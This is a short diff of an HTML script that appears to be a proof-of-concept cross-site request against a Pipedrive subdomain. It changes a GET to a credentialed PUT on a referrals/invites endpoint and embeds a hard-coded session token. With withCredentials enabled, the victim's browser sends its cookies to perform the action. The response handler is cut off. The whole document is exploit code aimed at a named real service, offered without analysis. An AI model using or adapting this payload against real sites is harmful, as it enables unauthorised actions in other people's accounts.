@@ -3,8 +3,8 @@
 <script>
 var req = new XMLHttpRequest();
 req.onload = reqListener;
-req.open('get','https://aasas2.pipedrive.com/menu-waitress',true);
-req.withCredentials = false;
+req.open('put','https://aasas2.pipedrive.com/referrals/invites?session_token=86792f956b4a147e5ff0753dec8394aa&strict_mode=true',true);
+req.withCredentials = true;
 req.send();
 
 function reqListener() {
